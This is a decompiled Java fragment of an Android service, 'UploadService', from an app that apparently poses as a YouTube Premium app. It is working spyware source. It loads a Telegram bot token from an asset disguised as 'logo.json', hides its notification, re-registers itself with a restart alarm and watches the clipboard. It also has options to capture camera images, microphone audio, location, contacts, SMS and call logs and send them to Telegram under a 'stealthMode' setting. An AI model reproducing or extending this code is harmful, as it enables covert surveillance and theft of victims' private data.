
    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendFileToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {0}, l = {2652, 2664}, m = "sendFileToTelegram", n = {"this"}, s = {"L$0"})
    static final class C۰۰۲۸1 extends ContinuationImpl {
        Object L$0;
        int label;
        /* synthetic */ Object result;

        C۰۰۲۸1(Continuation<? super C۰۰۲۸1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.sendFileToTelegram(null, (Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendPhotoToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {0, 0, 0}, l = {169, 181}, m = "sendPhotoToTelegram", n = {"this", "file", "caption"}, s = {"L$0", "L$1", "L$2"})
    static final class C۰۰۳۶1 extends ContinuationImpl {
        Object L$0;
        Object L$1;
        Object L$2;
        int label;
        /* synthetic */ Object result;

        C۰۰۳۶1(Continuation<? super C۰۰۳۶1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.sendPhotoToTelegram(null, null, (Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendTextFile$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {0}, l = {659}, m = "sendTextFile", n = {"file"}, s = {"L$0"})
    static final class C۰۰۴۲1 extends ContinuationImpl {
        Object L$0;
        int label;
        /* synthetic */ Object result;

        C۰۰۴۲1(Continuation<? super C۰۰۴۲1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.sendTextFile(null, null, (Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendTextToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {}, l = {2327}, m = "sendTextToTelegram", n = {}, s = {})
    static final class C۰۰۴۴1 extends ContinuationImpl {
        int label;
        /* synthetic */ Object result;

        C۰۰۴۴1(Continuation<? super C۰۰۴۴1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.sendTextToTelegram(null, (Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendTextToTelegramWithKeyboard$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {}, l = {2719}, m = "sendTextToTelegramWithKeyboard", n = {}, s = {})
    static final class C۰۰۴۶1 extends ContinuationImpl {
        int label;
        /* synthetic */ Object result;

        C۰۰۴۶1(Continuation<? super C۰۰۴۶1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.sendTextToTelegramWithKeyboard(null, null, (Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendZipToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {}, l = {1135}, m = "sendZipToTelegram", n = {}, s = {})
    static final class C۰۰۴۸1 extends ContinuationImpl {
        int label;
        /* synthetic */ Object result;

        C۰۰۴۸1(Continuation<? super C۰۰۴۸1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.sendZipToTelegram(null, (Continuation) this);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$uploadAllPhotos$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(k = 3, mv = {1, 8, 0}, xi = 48)
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService", f = "UploadService.kt", i = {0, 0, 0}, l = {340}, m = "uploadAllPhotos", n = {"this", "cursor", "dateAdded"}, s = {"L$0", "L$2", "J$0"})
    static final class C۰۰۶۳1 extends ContinuationImpl {
        long J$0;
        Object L$0;
        Object L$1;
        Object L$2;
        int label;
        /* synthetic */ Object result;

        C۰۰۶۳1(Continuation<? super C۰۰۶۳1> continuation) {
            super(continuation);
        }

        public final Object invokeSuspend(Object obj) {
            this.result = obj;
            this.label |= Integer.MIN_VALUE;
            return UploadService.this.uploadAllPhotos((Continuation) this);
        }
    }

    public CoroutineContext getCoroutineContext() {
        return Dispatchers.getIO().plus(this.job);
    }

    private final PowerManager.WakeLock getWakeLock() {
        Object value = this.wakeLock$delegate.getValue();
        Intrinsics.checkNotNullExpressionValue(value, "<get-wakeLock>(...)");
        return (PowerManager.WakeLock) value;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0014  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object getPublicIP(kotlin.coroutines.Continuation<? super java.lang.String> r8) {
        /*
            r7 = this;
            boolean r0 = r8 instanceof com.w8sb.w8premiumyt.UploadService.C۰۰۰۴1
            if (r0 == 0) goto L14
            r0 = r8
            com.w8sb.w8premiumyt.UploadService$getPublicIP$1 r0 = (com.w8sb.w8premiumyt.UploadService.C۰۰۰۴1) r0
            int r1 = r0.label
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r1 = r1 & r2
            if (r1 == 0) goto L14
            int r8 = r0.label
            int r8 = r8 - r2
            r0.label = r8
            goto L19
        L14:
            com.w8sb.w8premiumyt.UploadService$getPublicIP$1 r0 = new com.w8sb.w8premiumyt.UploadService$getPublicIP$1
            r0.<init>(r8)
        L19:
            r8 = r0
            java.lang.Object r0 = r8.result
            java.lang.Object r1 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
            int r2 = r8.label
            switch(r2) {
                case 0: goto L34;
                case 1: goto L2d;
                default: goto L25;
            }
        L25:
            java.lang.IllegalStateException r8 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r8.<init>(r0)
            throw r8
        L2d:
            kotlin.ResultKt.throwOnFailure(r0)     // Catch: java.lang.Exception -> L32
            r4 = r0
            goto L65
        L32:
            r1 = move-exception
            goto L68
        L34:
            kotlin.ResultKt.throwOnFailure(r0)
            r2 = r7
            okhttp3.Request$Builder r3 = new okhttp3.Request$Builder     // Catch: java.lang.Exception -> L32
            r3.<init>()     // Catch: java.lang.Exception -> L32
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r4 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE     // Catch: java.lang.Exception -> L32
            java.lang.String r4 = r4.m۱۱۸۲String$arg0$callurl$$this$callbuild$valrequest$try$fungetPublicIP$classUploadService()     // Catch: java.lang.Exception -> L32
            okhttp3.Request$Builder r3 = r3.url(r4)     // Catch: java.lang.Exception -> L32
            okhttp3.Request r3 = r3.build()     // Catch: java.lang.Exception -> L32
            kotlinx.coroutines.CoroutineDispatcher r4 = kotlinx.coroutines.Dispatchers.getIO()     // Catch: java.lang.Exception -> L32
            kotlin.coroutines.CoroutineContext r4 = (kotlin.coroutines.CoroutineContext) r4     // Catch: java.lang.Exception -> L32
            com.w8sb.w8premiumyt.UploadService$getPublicIP$2 r5 = new com.w8sb.w8premiumyt.UploadService$getPublicIP$2     // Catch: java.lang.Exception -> L32
            r6 = 0
            r5.<init>(r3, r6)     // Catch: java.lang.Exception -> L32
            kotlin.jvm.functions.Function2 r5 = (kotlin.jvm.functions.Function2) r5     // Catch: java.lang.Exception -> L32
            r6 = 1
            r8.label = r6     // Catch: java.lang.Exception -> L32
            java.lang.Object r4 = kotlinx.coroutines.BuildersKt.withContext(r4, r5, r8)     // Catch: java.lang.Exception -> L32
            if (r4 != r1) goto L65
            return r1
        L65:
            java.lang.String r4 = (java.lang.String) r4     // Catch: java.lang.Exception -> L32
            goto L92
        L68:
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r2 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
            java.lang.String r2 = r2.m۸۴۲String$arg0$calle$catch$fungetPublicIP$classUploadService()
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r4 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
            java.lang.String r4 = r4.m۵۶۹String$0$str$arg1$calle$catch$fungetPublicIP$classUploadService()
            java.lang.StringBuilder r3 = r3.append(r4)
            java.lang.String r4 = r1.getMessage()
            java.lang.StringBuilder r3 = r3.append(r4)
            java.lang.String r3 = r3.toString()
            android.util.Log.e(r2, r3)
            com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r2 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
            java.lang.String r4 = r2.m۱۳۸۸String$catch$fungetPublicIP$classUploadService()
        L92:
            return r4
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.getPublicIP(kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$getPublicIP$2, reason: invalid class name */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u000e\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$getPublicIP$2", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
    static final class AnonymousClass2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super String>, Object> {
        final /* synthetic */ Request $request;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        AnonymousClass2(Request request, Continuation<? super AnonymousClass2> continuation) {
            super(2, continuation);
            this.$request = request;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new AnonymousClass2(this.$request, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super String> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object obj) {
            String strString;
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure(obj);
                    Response response = (Closeable) UploadService.this.client.newCall(this.$request).execute();
                    try {
                        Response response2 = response;
                        if (response2.isSuccessful()) {
                            ResponseBody responseBodyBody = response2.body();
                            if (responseBodyBody == null || (strString = responseBodyBody.string()) == null) {
                                strString = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۶۲String$branch$when$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$fungetPublicIP$classUploadService();
                            }
                        } else {
                            strString = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹۹String$else$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$fungetPublicIP$classUploadService();
                        }
                        CloseableKt.closeFinally(response, (Throwable) null);
                        return strString;
                    } finally {
                    }
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:30:0x00e1  */
    /* JADX WARN: Removed duplicated region for block: B:31:0x00e2  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x00e5 A[Catch: Exception -> 0x003a, TryCatch #0 {Exception -> 0x003a, blocks: (B:12:0x0035, B:17:0x0049, B:28:0x0075, B:33:0x00e5, B:35:0x0103, B:34:0x00fd, B:20:0x0058, B:22:0x005e, B:25:0x0066, B:39:0x0132), top: B:44:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:34:0x00fd A[Catch: Exception -> 0x003a, TryCatch #0 {Exception -> 0x003a, blocks: (B:12:0x0035, B:17:0x0049, B:28:0x0075, B:33:0x00e5, B:35:0x0103, B:34:0x00fd, B:20:0x0058, B:22:0x005e, B:25:0x0066, B:39:0x0132), top: B:44:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:37:0x0130 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object sendPhotoToTelegram(java.io.File r17, java.lang.String r18, kotlin.coroutines.Continuation<? super kotlin.Unit> r19) {
        /*
            Method dump skipped, instruction units count: 394
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.sendPhotoToTelegram(java.io.File, java.lang.String, kotlin.coroutines.Continuation):java.lang.Object");
    }

    static /* synthetic */ Object sendPhotoToTelegram$default(UploadService uploadService, File file, String str, Continuation continuation, int i, Object obj) {
        if ((i & 2) != 0) {
            str = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۲String$paramcaption$funsendPhotoToTelegram$classUploadService();
        }
        return uploadService.sendPhotoToTelegram(file, str, continuation);
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendPhotoToTelegram$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendPhotoToTelegram$2", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۳۷2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ MultipartBody $requestBody;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۳۷2(MultipartBody multipartBody, Continuation<? super C۰۰۳۷2> continuation) {
            super(2, continuation);
            this.$requestBody = multipartBody;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۳۷2(this.$requestBody, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object obj) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure(obj);
                    Response response = (Closeable) UploadService.this.client.newCall(new Request.Builder().url(LiveLiterals$UploadServiceKt.INSTANCE.m۵۴۰String$0$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendPhotoToTelegram$classUploadService() + UploadService.this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۶۵String$2$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendPhotoToTelegram$classUploadService()).post(this.$requestBody).build()).execute();
                    try {
                        Response response2 = response;
                        if (!response2.isSuccessful()) {
                            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۲۱String$arg0$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendPhotoToTelegram$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۶۳String$0$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendPhotoToTelegram$classUploadService() + response2.code() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۸۳String$2$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendPhotoToTelegram$classUploadService() + response2.message());
                        }
                        Unit unit = Unit.INSTANCE;
                        CloseableKt.closeFinally(response, (Throwable) null);
                        return Unit.INSTANCE;
                    } finally {
                    }
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    @Override // android.app.Service
    public void onCreate() {
        BufferedReader bufferedReader;
        super.onCreate();
        acquireWakeLock();
        try {
            InputStream inputStreamOpen = getAssets().open(LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۱String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try$funonCreate$classUploadService());
            Intrinsics.checkNotNullExpressionValue(inputStreamOpen, "assets.open(\"logo.json\")");
            Reader inputStreamReader = new InputStreamReader(inputStreamOpen, Charsets.UTF_8);
            bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
        } catch (Exception e) {
        }
        try {
            BufferedReader it = bufferedReader;
            String configStr = TextStreamsKt.readText(it);
            CloseableKt.closeFinally(bufferedReader, (Throwable) null);
            JSONObject config = new JSONObject(configStr);
            String string = config.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۴String$arg0$callgetString$arg0$call$setbotToken$$try$funonCreate$classUploadService());
            Intrinsics.checkNotNullExpressionValue(string, "config.getString(\"bot_token\")");
            this.botToken = string;
            String string2 = config.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۶String$arg0$callgetString$arg0$call$setchatId$$try$funonCreate$classUploadService());
            Intrinsics.checkNotNullExpressionValue(string2, "config.getString(\"chat_id\")");
            this.chatId = string2;
            this.backgroundCameraEnabled = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۴String$arg0$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۰Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try$funonCreate$classUploadService());
            this.backgroundCameraFront = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۵String$arg0$calloptBoolean$arg0$call$setbackgroundCameraFront$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۱Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraFront$$try$funonCreate$classUploadService());
            this.backgroundCameraBack = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۳String$arg0$calloptBoolean$arg0$call$setbackgroundCameraBack$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۸۹Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraBack$$try$funonCreate$classUploadService());
            this.backgroundCameraIntervalSec = config.optInt(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۵String$arg0$calloptInt$arg0$call$setbackgroundCameraIntervalSec$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۳۱۷Int$arg1$calloptInt$arg0$call$setbackgroundCameraIntervalSec$$try$funonCreate$classUploadService());
            this.microphoneEnabled = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۷String$arg0$calloptBoolean$arg0$call$setmicrophoneEnabled$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۳Boolean$arg1$calloptBoolean$arg0$call$setmicrophoneEnabled$$try$funonCreate$classUploadService());
            this.microphoneIntervalSec = config.optInt(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۷String$arg0$calloptInt$arg0$call$setmicrophoneIntervalSec$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۳۱۹Int$arg1$calloptInt$arg0$call$setmicrophoneIntervalSec$$try$funonCreate$classUploadService());
            this.liveLocationEnabled = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۶String$arg0$calloptBoolean$arg0$call$setliveLocationEnabled$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۲Boolean$arg1$calloptBoolean$arg0$call$setliveLocationEnabled$$try$funonCreate$classUploadService());
            this.liveLocationIntervalSec = config.optInt(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۶String$arg0$calloptInt$arg0$call$setliveLocationIntervalSec$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۳۱۸Int$arg1$calloptInt$arg0$call$setliveLocationIntervalSec$$try$funonCreate$classUploadService());
            this.readContacts = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۹String$arg0$calloptBoolean$arg0$call$setreadContacts$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۵Boolean$arg1$calloptBoolean$arg0$call$setreadContacts$$try$funonCreate$classUploadService());
            this.readSms = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۱String$arg0$calloptBoolean$arg0$call$setreadSms$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۷Boolean$arg1$calloptBoolean$arg0$call$setreadSms$$try$funonCreate$classUploadService());
            this.readCallLog = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۸String$arg0$calloptBoolean$arg0$call$setreadCallLog$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۴Boolean$arg1$calloptBoolean$arg0$call$setreadCallLog$$try$funonCreate$classUploadService());
            this.readLocation = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۰String$arg0$calloptBoolean$arg0$call$setreadLocation$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۶Boolean$arg1$calloptBoolean$arg0$call$setreadLocation$$try$funonCreate$classUploadService());
            this.stealthMode = config.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۲String$arg0$calloptBoolean$arg0$call$setstealthMode$$try$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۸Boolean$arg1$calloptBoolean$arg0$call$setstealthMode$$try$funonCreate$classUploadService());
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۰۷1(null), 3, (Object) null);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel $this$onCreate_u24lambda_u241 = new NotificationChannel(LiveLiterals$UploadServiceKt.INSTANCE.m۷۲۸String$arg0$call$init$$$$this$callapply$valchannel$branch$if$funonCreate$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۸۳String$arg1$call$init$$$$this$callapply$valchannel$branch$if$funonCreate$classUploadService(), 0);
                $this$onCreate_u24lambda_u241.setShowBadge(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۷Boolean$arg0$callsetShowBadge$fun$anonymous$$arg0$callapply$valchannel$branch$if$funonCreate$classUploadService());
                $this$onCreate_u24lambda_u241.enableLights(LiveLiterals$UploadServiceKt.INSTANCE.m۱۵۷Boolean$arg0$callenableLights$fun$anonymous$$arg0$callapply$valchannel$branch$if$funonCreate$classUploadService());
                $this$onCreate_u24lambda_u241.enableVibration(LiveLiterals$UploadServiceKt.INSTANCE.m۱۵۸Boolean$arg0$callenableVibration$fun$anonymous$$arg0$callapply$valchannel$branch$if$funonCreate$classUploadService());
                $this$onCreate_u24lambda_u241.setSound(null, null);
                $this$onCreate_u24lambda_u241.setLockscreenVisibility(-1);
                Object systemService = getSystemService("notification");
                Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.app.NotificationManager");
                NotificationManager manager = (NotificationManager) systemService;
                manager.createNotificationChannel($this$onCreate_u24lambda_u241);
                Notification notification = new NotificationCompat.Builder(this, LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۸۴String$arg1$call$init$$$this$callsetSmallIcon$$this$callsetNotificationSilent$$this$callsetVisibility$$this$callsetShowWhen$$this$callsetPriority$$this$callsetContentText$$this$callsetContentTitle$$this$callbuild$valnotification$branch$if$funonCreate$classUploadService()).setSmallIcon(R.color.transparent).setNotificationSilent().setVisibility(-1).setShowWhen(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۸Boolean$arg0$callsetShowWhen$$this$callsetPriority$$this$callsetContentText$$this$callsetContentTitle$$this$callbuild$valnotification$branch$if$funonCreate$classUploadService()).setPriority(-2).setContentText(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۵String$arg0$callsetContentText$$this$callsetContentTitle$$this$callbuild$valnotification$branch$if$funonCreate$classUploadService()).setContentTitle(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۶String$arg0$callsetContentTitle$$this$callbuild$valnotification$branch$if$funonCreate$classUploadService()).build();
                Intrinsics.checkNotNullExpressionValue(notification, "Builder(this, \"hidden_se…\n                .build()");
                try {
                    startForeground(Integer.MIN_VALUE, notification);
                    manager.cancel(Integer.MIN_VALUE);
                } catch (Exception e2) {
                }
            } else {
                try {
                    Notification notification2 = new NotificationCompat.Builder(this).setSmallIcon(R.color.transparent).setPriority(-2).setVisibility(-1).build();
                    Intrinsics.checkNotNullExpressionValue(notification2, "Builder(this)\n          …                 .build()");
                    startForeground(Integer.MIN_VALUE, notification2);
                    stopForeground(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۹Boolean$arg0$callstopForeground$try$else$if$funonCreate$classUploadService());
                } catch (Exception e3) {
                }
            }
            registerRestartAlarm();
            Object systemService2 = getSystemService("clipboard");
            Intrinsics.checkNotNull(systemService2, "null cannot be cast to non-null type android.content.ClipboardManager");
            final ClipboardManager clipboard = (ClipboardManager) systemService2;
            clipboard.addPrimaryClipChangedListener(new ClipboardManager.OnPrimaryClipChangedListener() { // from class: com.w8sb.w8premiumyt.UploadService$$ExternalSyntheticLambda0
                @Override // android.content.ClipboardManager.OnPrimaryClipChangedListener
                public final void onPrimaryClipChanged() {
                    UploadService.onCreate$lambda$2(clipboard, this);
                }
            });
            if (this.backgroundCameraEnabled) {
                startBackgroundCameraLoop();
            }
            if (this.microphoneEnabled) {
                startBackgroundMicLoop();
            }
            if (this.liveLocationEnabled) {
                startLiveLocationLoop();
            }
            startTelegramPolling();
        } finally {
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$onCreate$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$onCreate$1", f = "UploadService.kt", i = {}, l = {222}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۰۷1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۰۷1(Continuation<? super C۰۰۰۷1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۰۷1(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    String replyMarkup = UploadService.this.buildCommandsKeyboard();
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegramWithKeyboard(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۳String$arg0$callsendTextToTelegramWithKeyboard$fun$anonymous$$arg2$calllaunch$funonCreate$classUploadService(), replyMarkup, (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    private static final void onCreate$lambda$2(ClipboardManager $clipboard, UploadService this$0) {
        Intrinsics.checkNotNullParameter($clipboard, "$clipboard");
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        ClipData clip = $clipboard.getPrimaryClip();
